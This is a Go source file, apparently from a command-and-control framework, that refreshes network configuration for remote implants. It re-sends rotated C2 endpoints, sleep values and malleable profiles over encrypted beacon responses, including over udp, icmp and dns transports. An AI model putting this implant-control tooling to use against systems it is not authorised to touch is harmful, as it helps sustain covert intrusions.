package server

import (
	"time"

	"github.com/forgec2/forgec2/internal/db"
	"github.com/forgec2/forgec2/pkg/protocol"
)

// Online network-config refresh (config-over-wire on an established session).
//
// Registration/handshake responses already carry the config, but a beacon that
// stays up for days would otherwise never see a rotated C2 endpoint, sleep
// value or malleable profile. Encrypted beacon responses now carry the same
// secret-bound blob when:
//
//   - the assembled config fingerprint differs from the last one delivered to
//     that agent (operator changed a listener/profile/sleep), or
//   - the last delivery is older than networkConfigRefreshInterval (self-heal
//     after a dropped frame, a server restart, or a stale persisted blob).
//
// The per-agent bookkeeping is in-memory: a server restart simply refreshes
// every agent on its next beacon, which is the desired behaviour. It is pruned
// hourly by the registration-secret sweep so deleted agents cannot pin entries.

const (
	// networkConfigRefreshInterval is the maximum age of a delivered config
	// before it is resent even when unchanged.
	networkConfigRefreshInterval = 15 * time.Minute
	// networkConfigDeliveryTTL is how long per-agent delivery bookkeeping is
	// retained after the last send. Live agents refresh every 15 minutes, so
	// only departed agents age out.
	networkConfigDeliveryTTL = 24 * time.Hour
	// maxNetworkConfigDeliveries bounds the bookkeeping map. At the cap the
	// oldest entries are evicted; a missing entry only causes one extra
	// refresh, never lost data.
	maxNetworkConfigDeliveries = 50_000
)

type networkConfigDelivery struct {
	fingerprint string
	sentAt      time.Time
	// generation is the server config generation that was current when the
	// fingerprint was checked. It lets a bumped generation trigger a fresh
	// assembly without assembling on every beacon.
	generation uint64
}

// markNetworkConfigChanged bumps the config generation. Call sites are the
// listener registry (broadcastListenerUpdate), set_sleep results and the config
// reloader; a missed site only delays that change until the periodic refresh.
func (s *Server) markNetworkConfigChanged() {
	s.networkConfigMu.Lock()
	s.networkConfigGeneration++
	s.networkConfigMu.Unlock()
}

// networkConfigMayRefresh is the cheap pre-check that keeps assembleNetworkConfig
// (a listener DB lookup plus profile parsing) off the per-beacon hot path: it
// only returns true when the agent has no delivery yet, the server config
// generation moved, or the periodic refresh is due.
func (s *Server) networkConfigMayRefresh(agentID string, now time.Time) bool {
	s.networkConfigMu.Lock()
	defer s.networkConfigMu.Unlock()
	prev, ok := s.networkConfigDelivered[agentID]
	if !ok || prev.generation != s.networkConfigGeneration {
		return true
	}
	return now.Sub(prev.sentAt) >= networkConfigRefreshInterval
}

// networkConfigForBeacon returns the encrypted config blob to attach to an
// encrypted beacon response, or "" when no refresh is due (or the transport
// cannot carry it). maxBytes > 0 rejects a blob that would not fit a datagram
// transport's single-frame budget; the next stream-transport beacon still
// refreshes.
func (s *Server) networkConfigForBeacon(imp db.Implant, now time.Time, maxBytes int) string {
	if s == nil || s.regSecrets == nil || imp.ID == "" || imp.SecretID == "" {
		return ""
	}
	if !s.networkConfigMayRefresh(imp.ID, now) {
		return ""
	}
	regKey := s.regSecretByID(imp.SecretID)
	if len(regKey) != 32 {
		return ""
	}
	nc := s.assembleNetworkConfig(imp)
	fingerprint := protocol.NetworkConfigFingerprint(nc)
	if fingerprint == "" {
		return ""
	}
	if !s.networkConfigRefreshDue(imp.ID, fingerprint, now) {
		return ""
	}
	blob, err := protocol.EncryptNetworkConfig(regKey, nc)
	if err != nil {
		return ""
	}
	if maxBytes > 0 && len(blob) > maxBytes {
		// Datagram transports (udp/icmp/dns) must fit the response in one
		// frame; skip instead of emitting an oversized packet. The periodic
		// check retries on the next beacon.
		return ""
	}
	s.recordNetworkConfigDelivery(imp.ID, fingerprint, now)
	return blob
}

// networkConfigRefreshDue is the post-assembly decision. A generation bump with
// an unchanged fingerprint records the check without sending, so subsequent
// beacons take the cheap path again.
func (s *Server) networkConfigRefreshDue(agentID, fingerprint string, now time.Time) bool {
	s.networkConfigMu.Lock()
	defer s.networkConfigMu.Unlock()
	prev, ok := s.networkConfigDelivered[agentID]
	if !ok || prev.fingerprint != fingerprint || now.Sub(prev.sentAt) >= networkConfigRefreshInterval {
		return true
	}
	prev.generation = s.networkConfigGeneration
	s.networkConfigDelivered[agentID] = prev
	return false
}

// recordNetworkConfigDelivery remembers what was shipped so unchanged configs
// are not retransmitted on every beacon.
func (s *Server) recordNetworkConfigDelivery(agentID, fingerprint string, now time.Time) {
	s.networkConfigMu.Lock()
	defer s.networkConfigMu.Unlock()
	if s.networkConfigDelivered == nil {
		s.networkConfigDelivered = make(map[string]networkConfigDelivery)
	}
	if len(s.networkConfigDelivered) >= maxNetworkConfigDeliveries {
		// Drop stale entries first; if the cap is still hit, evict arbitrary
		// entries (they only cause a redundant refresh).
		s.pruneNetworkConfigDeliveriesLocked(now.Add(-time.Hour))
		for id := range s.networkConfigDelivered {
			if len(s.networkConfigDelivered) < maxNetworkConfigDeliveries {
				break
			}
			delete(s.networkConfigDelivered, id)
		}
	}
	s.networkConfigDelivered[agentID] = networkConfigDelivery{
		fingerprint: fingerprint,
		sentAt:      now,
		generation:  s.networkConfigGeneration,
	}
}

// pruneNetworkConfigDeliveries drops bookkeeping older than cutoff.
func (s *Server) pruneNetworkConfigDeliveries(cutoff time.Time) {
	s.networkConfigMu.Lock()
	defer s.networkConfigMu.Unlock()
	s.pruneNetworkConfigDeliveriesLocked(cutoff)
}

func (s *Server) pruneNetworkConfigDeliveriesLocked(cutoff time.Time) {
	for id, delivery := range s.networkConfigDelivered {
		if delivery.sentAt.Before(cutoff) {
			delete(s.networkConfigDelivered, id)
		}
	}
}
